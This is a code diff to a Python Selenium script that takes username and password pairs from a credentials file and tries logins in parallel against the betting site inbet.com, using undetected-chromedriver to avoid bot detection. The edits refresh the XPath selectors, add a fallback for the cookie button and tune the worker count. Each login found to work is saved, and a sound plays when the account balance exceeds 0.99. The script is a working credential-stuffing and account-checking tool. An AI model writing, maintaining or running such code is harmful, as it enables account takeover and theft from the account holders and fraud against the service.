@@ -12,6 +12,10 @@ import threading
 import keyboard  # for detecting keypresses
 from colorama import Fore, Style, init
 import sys
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from datetime import datetime
+import multiprocessing
 
 wrongpass_file = r"C:\Users\petar\Desktop\inbet\wrongpass.txt"
 
@@ -36,7 +40,7 @@ def emergency_stop_listener():
 
     while True:
         event = keyboard.read_event()
-        if event.event_type == keyboard.KEY_DOWN and event.name == 's':
+        if event.event_type == keyboard.KEY_DOWN and event.name == 'i':
             buffer.append(time.time())
             buffer = [t for t in buffer if time.time() - t < 3]
             if len(buffer) >= 5:
@@ -91,7 +95,7 @@ def init_driver(block_images=True):
         prefs = {"profile.managed_default_content_settings.images": 2}
         options.add_experimental_option("prefs", prefs)
 
-    version_main = 139
+    version_main = 142
     driver = uc.Chrome(options=options, version_main=version_main)
     driver.set_window_size(1920, 1080)
     return driver
@@ -102,25 +106,36 @@ def login(credentials):
 
     try:
         driver.get(login_page_url)
-        wait = WebDriverWait(driver, 30)
+        wait = WebDriverWait(driver, 20)
 
         # Accept cookies
         try:
+            xpath_btn = '/html/body/div[1]/div/div[4]/div[1]/div/div[2]/button[1]'
             accept_cookies_btn = wait.until(
-                EC.presence_of_element_located((By.CSS_SELECTOR, '[data-qid="accept-cookies"]'))
+                EC.presence_of_element_located((By.XPATH, xpath_btn))
             )
             try:
-                accept_cookies_btn.click()
+                wait.until(EC.element_to_be_clickable((By.XPATH, xpath_btn))).click()
             except Exception:
                 driver.execute_script("arguments[0].click();", accept_cookies_btn)
             log("Cookies accepted.", "INFO", username, password)
         except Exception:
-            log("Accept Cookies button not found. Continuing...", "WARNING", username, password)
-
-        # Open login window
+            try:
+                css_qid = '[data-qid="accept-cookies"]'
+                accept_cookies_btn = wait.until(
+                    EC.presence_of_element_located((By.CSS_SELECTOR, css_qid))
+                )
+                try:
+                    wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, css_qid))).click()
+                except Exception:
+                    driver.execute_script("arguments[0].click();", accept_cookies_btn)
+                log("Cookies accepted (fallback).", "INFO", username, password)
+            except Exception:
+                log("Accept Cookies button not found. Continuing...", "WARNING", username, password)
+                # Open login window
         try:
             login_button = wait.until(
-                EC.element_to_be_clickable((By.XPATH, "/html/body/div[2]/div[2]/div/nav/div/div/div[3]/div[3]/div[2]"))
+                EC.element_to_be_clickable((By.XPATH, "/html/body/div[3]/div[2]/div[1]/nav/div/div/div[3]/div/button[2]"))
             )
             login_button.click()
             log("Login window opened.", "INFO", username, password)
@@ -132,7 +147,7 @@ def login(credentials):
         try:
             username_field = wait.until(
                 EC.visibility_of_element_located(
-                    (By.XPATH, "/html/body/div[2]/div[2]/div[2]/div/div/div/div/div/form/div[1]/div/div/div/input")
+                    (By.XPATH, "/html/body/div[3]/div[2]/div[3]/div/div/div/div/form/div[1]/div/div/div/input")
                 )
             )
             username_field.send_keys(username)
@@ -145,7 +160,7 @@ def login(credentials):
         try:
             password_field = wait.until(
                 EC.visibility_of_element_located(
-                    (By.XPATH, "/html/body/div[2]/div[2]/div[2]/div/div/div/div/div/form/div[2]/div/div/div/input")
+                    (By.XPATH, "/html/body/div[3]/div[2]/div[3]/div/div/div/div/form/div[2]/div/div/div/input")
                 )
             )
             password_field.send_keys(password)
@@ -158,7 +173,7 @@ def login(credentials):
         try:
             submit_button = wait.until(
                 EC.element_to_be_clickable(
-                    (By.XPATH, "/html/body/div[2]/div[2]/div[2]/div/div/div/div/div/form/button")
+                    (By.XPATH, "/html/body/div[3]/div[2]/div[3]/div/div/div/div/form/button")
                 )
             )
             submit_button.click()
@@ -275,10 +290,10 @@ def login(credentials):
 
         # Sound if balance high
         balance_value = float(formatted_amount.replace(',', '.'))
-        if balance_value > 9.99:
+        if balance_value > 0.99:
             try:
                 winsound.PlaySound(
-                    r"C:\Users\petar\Desktop\inbet\minet.wav",
+                    r"C:\Users\petar\Desktop\inbet\inbet.wav",
                     winsound.SND_FILENAME | winsound.SND_ASYNC
                 )
                 log("Sound played for high balance.", "SUCCESS", username, password)
@@ -298,8 +313,8 @@ def login(credentials):
 def main():
     global login_page_url, success_logins_file, stop_flag
 
-    credentials_file = 'credentials.txt'
-    success_logins_file = r"C:\Users\petar\Desktop\inbet\balance_and_bets_sounds.txt"
+    credentials_file = 'uniquecredentials.txt'
+    success_logins_file = r"C:\\Users\\petar\\Desktop\\inbet\\PatrickAIPlatinum.txt"
     os.makedirs(os.path.dirname(success_logins_file), exist_ok=True)
 
     login_page_url = "https://inbet.com/sports"
@@ -308,9 +323,12 @@ def main():
     listener_thread = threading.Thread(target=emergency_stop_listener, daemon=True)
     listener_thread.start()
 
-    max_workers = 27
+    max_workers = 7
+    #max_workers = min(multiprocessing.cpu_count(), len(credentials))
+    print(f"[INFO] Starting with {max_workers} workers...")
+
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
-        executor.map(login, credentials)
+        executor.map(lambda cred: login(cred), credentials)
 
 if __name__ == "__main__":
     main()
